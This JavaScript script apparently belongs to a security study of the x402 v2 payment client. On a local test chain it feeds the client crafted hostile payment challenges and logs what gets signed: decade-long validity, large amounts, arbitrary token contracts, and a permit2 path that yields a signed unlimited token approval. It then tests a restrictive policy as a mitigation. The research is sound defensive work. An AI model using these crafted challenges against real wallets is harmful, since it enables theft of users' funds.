// Part 3: what the official x402 v2 client (2.32.0) signs when the 402 itself is hostile.
// No server: each case hands a crafted PaymentRequired to x402Client.createPaymentPayload.
// A plain local anvil (chain id 84532, no fork) answers the RPC reads the SDK makes; nothing is broadcast.
import { createPublicClient, http, parseTransaction, decodeFunctionData, parseAbi, maxUint256 } from "viem";
import { privateKeyToAccount, generatePrivateKey } from "viem/accounts";
import { baseSepolia } from "viem/chains";
import { x402Client } from "@x402/core/client";
import { ExactEvmScheme } from "@x402/evm/exact/client";
import { toClientEvmSigner } from "@x402/evm";
import { startAnvil, USDC } from "./lib.mjs";

const log = (...a) => console.log(...a);
const node = await startAnvil({ fork: false });
const publicClient = createPublicClient({ chain: baseSepolia, transport: http(node.rpc) });
const account = privateKeyToAccount(generatePrivateKey());
const PAYTO = privateKeyToAccount(generatePrivateKey()).address;

const req = (over = {}) => ({
	scheme: "exact", network: "eip155:84532", amount: "10000", asset: USDC, payTo: PAYTO,
	maxTimeoutSeconds: 120, extra: { name: "USDC", version: "2" }, ...over,
});
const challenge = (accepts, extensions) => ({
	x402Version: 2, resource: { url: "https://api.example.test/data", description: "", mimeType: "application/json" },
	accepts: [accepts], ...(extensions ? { extensions } : {}),
});
// The composition the SDK documents for a local key: toClientEvmSigner(privateKeyToAccount(...), publicClient).
const documentedSigner = toClientEvmSigner(account, publicClient);
const minimalSigner = toClientEvmSigner({ address: account.address, signTypedData: (m) => account.signTypedData(m) });
const clientWith = (signer, opts) => {
	const c = new x402Client().register("eip155:*", new ExactEvmScheme(signer));
	if (opts?.spendControls !== undefined) c.setSpendControls(opts.spendControls);
	return c;
};
async function attempt(label, client, pr) {
	try {
		const p = await client.createPaymentPayload(pr);
		log(`  ${label}: SIGNED`);
		return p;
	} catch (e) {
		log(`  ${label}: REFUSED (${String(e.message).slice(0, 140)})`);
	}
}
const now = () => Math.floor(Date.now() / 1000);

log("a. maxTimeoutSeconds = 10 years");
const pa = await attempt("default x402Client", clientWith(minimalSigner), challenge(req({ maxTimeoutSeconds: 315_360_000 })));
if (pa) log(`     validBefore - now = ${Number(pa.payload.authorization.validBefore) - now()} s (~${((Number(pa.payload.authorization.validBefore) - now()) / 31_536_000).toFixed(1)} years)`);

log("b. amount = 1000 USDC");
await attempt("default x402Client (spendControls default)", clientWith(minimalSigner), challenge(req({ amount: "1000000000" })));
await attempt("x402Client with spendControls: false", clientWith(minimalSigner, { spendControls: false }), challenge(req({ amount: "1000000000" })));

log("c. asset = a token that is not the default USDC");
const OTHER = "0x1111111111111111111111111111111111111111";
await attempt("default x402Client", clientWith(minimalSigner), challenge(req({ asset: OTHER })));
const pc = await attempt("x402Client with spendControls: false", clientWith(minimalSigner, { spendControls: false }), challenge(req({ asset: OTHER })));
if (pc) log(`     signed a TransferWithAuthorization whose verifyingContract is ${OTHER}`);

log('d. extra.name = "USD Coin" on eip155:84532 (the token says "USDC")');
const pd = await attempt("default x402Client", clientWith(minimalSigner), challenge(req({ extra: { name: "USD Coin", version: "2" } })));
if (pd) log("     signed with the server-supplied name: no check against the token or the SDK's own default-asset table");

log("e. extra.assetTransferMethod = permit2 and the server declares erc20ApprovalGasSponsoring");
const hostile = challenge(req({ extra: { name: "USDC", version: "2", assetTransferMethod: "permit2" } }), { erc20ApprovalGasSponsoring: { info: {}, schema: {} } });
const pe = await attempt("default x402Client, documented signer (local account + publicClient)", clientWith(documentedSigner), hostile);
if (pe) {
	const p2 = pe.payload.permit2Authorization;
	log(`     Permit2 PermitWitnessTransferFrom: token ${p2.permitted.token} amount ${p2.permitted.amount} spender ${p2.spender} witness.to ${p2.witness.to}`);
	const info = pe.extensions?.erc20ApprovalGasSponsoring?.info;
	if (info?.signedTransaction) {
		const tx = parseTransaction(info.signedTransaction);
		const call = decodeFunctionData({ abi: parseAbi(["function approve(address spender, uint256 amount)"]), data: tx.data });
		log(`     plus a SIGNED RAW TRANSACTION: to ${tx.to} (the token) ${call.functionName}(${call.args[0]}, ${call.args[1] === maxUint256 ? "2^256-1" : call.args[1]}) chainId ${tx.chainId} nonce ${tx.nonce}`);
	} else log("     no approval transaction in the payload");
}
const pe2 = await attempt("default x402Client, minimal signer (address + signTypedData only)", clientWith(minimalSigner), hostile);
if (pe2) log(`     approval transaction present: ${Boolean(pe2.extensions?.erc20ApprovalGasSponsoring?.info?.signedTransaction)}; Permit2 witness signature present: ${Boolean(pe2.payload.permit2Authorization)}`);

log("f. a policy that refuses everything but EIP-3009 on the pinned USDC, short validity");
const strict = clientWith(minimalSigner).registerPolicy((_v, reqs) => reqs.filter((r) =>
	r.network === "eip155:84532" && r.asset.toLowerCase() === USDC.toLowerCase() &&
	(r.extra?.assetTransferMethod ?? "eip3009") === "eip3009" && r.extra?.name === "USDC" && r.extra?.version === "2" &&
	r.maxTimeoutSeconds <= 600));
await attempt("hostile permit2 challenge", strict, hostile);
await attempt("10-year validity", strict, challenge(req({ maxTimeoutSeconds: 315_360_000 })));
await attempt("ordinary challenge", strict, challenge(req()));

node.stop();
log("done");
process.exit(0);
